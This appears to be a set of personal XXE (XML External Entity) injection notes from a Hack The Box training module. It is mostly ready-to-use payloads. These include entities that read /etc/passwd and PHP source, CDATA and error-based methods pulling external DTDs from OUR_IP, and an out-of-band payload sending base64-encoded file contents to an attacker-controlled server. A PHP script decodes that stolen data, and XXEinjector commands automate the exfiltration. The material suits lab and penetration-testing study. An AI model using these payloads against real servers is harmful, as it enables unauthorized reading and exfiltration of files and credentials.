
### Identify

We can intercept request with Burp Suite and then see in the request if the data is being sent via XML

We can check in the response if we see any reflected values and if so it should be a good start on where to attempt injection


injecting xml entity for file disclosure
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

injecting xml entity for source code disclosure [PHP Only]
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```


## Advanced Methods


#### CDATA Method

Wrapping data in in CDATA Tag for arbitrary output [Must be all internal entities unless using parameter entities]
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
```

Using XML Parameter Entities [Example must be referenced externally]
```xml
<!ENTITY joined "%begin;%file;%end;">
```

Creating external resource holding xml parameter entities
```shell-session
Auzzie@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
Auzzie@htb[/htb]$ python3 -m http.server 8000
```

#### Error Based Method


Moving to a part of the site that displays error for our target page and we can retrieve a different set of output

Reference external resource with DTD
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Creating external resource to host holding payload for file disclosure
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```


## Blind XXE Injection


### Out-Of-Band

XML payload to upload to victim site
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

create external xml resource to host initial payload for file disclosure and OOB request
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

php script to decode OOB of request
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

host php server
```shell-session
php -S 0.0.0.0:8000
```


### Automated OOB

XXEinjector Tool
```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

Using XXEinjector (Just use starting tag of XML data request sent)
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Command for XXEInjector
```shell-session
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
**Note: In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there "Logs/IP/etc/"